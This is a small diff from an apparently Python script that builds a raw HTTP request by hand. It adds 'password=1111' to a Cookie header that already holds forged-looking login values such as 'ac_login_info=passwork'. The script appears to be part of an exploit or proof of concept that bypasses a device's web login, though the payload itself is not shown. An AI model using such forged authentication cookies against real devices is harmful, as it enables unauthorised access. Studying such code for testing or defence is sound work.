@@ -49,7 +49,7 @@ p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Geck
 p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
 p3 += b"Accept-Language: en-US,en;q=0.5" + rn
 p3 += b"Accept-Encoding: gzip, deflate" + rn
-p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A" + rn
+p3 += b"Cookie: password=1111; curShow=; ac_login_info=passwork; test=A" + rn
 p3 += b"Connection: close" + rn
 p3 += b"Upgrade-Insecure-Requests: 1" + rn
 p3 += (b"Content-Length: %d" % len(p2)) +rn
